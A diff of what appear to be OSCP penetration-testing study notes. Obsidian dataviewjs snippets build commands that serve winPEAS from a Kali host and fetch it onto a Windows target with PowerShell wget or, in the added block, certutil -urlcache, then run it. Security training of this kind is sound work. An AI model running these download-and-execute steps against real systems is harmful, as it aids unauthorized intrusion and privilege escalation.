@@ -28,7 +28,7 @@ wget https://github.com/peass-ng/PEASS-ng/releases/download/20260212-43b28429/wi
 ```
 
 ```
-cd ~/Desktop/Tools/PEAS && python -m http.server 80
+cd ~/Desktop/Tools/Windows && python -m http.server 80
 ```
 
 ```dataviewjs
@@ -38,7 +38,14 @@ const command = `powershell wget http://${KaliIP}/winPEASx64.exe -OutFile winPEA
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+or
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
+const command = `certutil -urlcache -split -f http://${KaliIP}/winPEASx64.exe winPEASx64.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 ```cmd
 winPEASx64.exe
 ```
